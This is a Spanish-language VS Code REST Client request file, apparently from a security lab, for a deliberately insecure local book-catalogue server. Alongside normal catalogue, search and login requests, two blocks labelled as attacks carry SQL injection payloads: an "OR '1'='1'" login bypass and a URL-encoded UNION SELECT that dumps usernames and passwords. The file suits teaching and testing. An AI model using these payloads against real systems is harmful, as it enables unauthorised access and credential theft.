@@ -1,0 +1,61 @@
+### peticiones.http -- version INSEGURA
+### ------------------------------------------------------------------
+### Coleccion de peticiones de ejemplo en formato REST Client (extension
+### "humao.rest-client" de VS Code). Abrir este archivo en VS Code con esa
+### extension instalada y hacer clic en "Send Request" sobre cada bloque
+### separado por "###". Requiere el servidor de esta carpeta corriendo en
+### el puerto 8801 (ver instrucciones.md).
+
+@baseUrl = http://localhost:8801
+
+
+### 1. Catalogo completo (camino feliz, sin entrada de usuario)
+GET {{baseUrl}}/api/libros
+
+
+### 2. Busqueda normal por titulo (camino feliz)
+# Se espera un resultado: "Cien años de soledad".
+GET {{baseUrl}}/api/buscar?titulo=Cien
+
+
+### 3. Login normal con credenciales correctas (camino feliz)
+POST {{baseUrl}}/api/login
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "admin123"
+}
+
+
+### 4. Login normal con credenciales INCORRECTAS (control, debe fallar)
+POST {{baseUrl}}/api/login
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "clave-incorrecta"
+}
+
+
+### 5. ATAQUE -- bypass de autenticacion via SQL Injection
+# Payload en "username": admin' OR '1'='1' --
+# La condicion "OR '1'='1'" siempre es verdadera y "--" comenta el resto
+# de la sentencia (incluida la comprobacion de password). Se espera
+# "ok": true SIN conocer la contrasenia real.
+POST {{baseUrl}}/api/login
+Content-Type: application/json
+
+{
+  "username": "admin' OR '1'='1' -- ",
+  "password": "cualquier-cosa"
+}
+
+
+### 6. ATAQUE -- extraccion de usuarios/contrasenias via UNION SELECT
+# Payload (decodificado): ' UNION SELECT username, password FROM usuarios --
+# Codificado en la URL porque el querystring no admite espacios/comillas
+# sin escapar. Se espera que "resultados" incluya filas con los username/
+# password de la tabla "usuarios" (ej. admin / admin123) en los campos
+# "titulo"/"autor".
+GET {{baseUrl}}/api/buscar?titulo=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20usuarios%20--%20
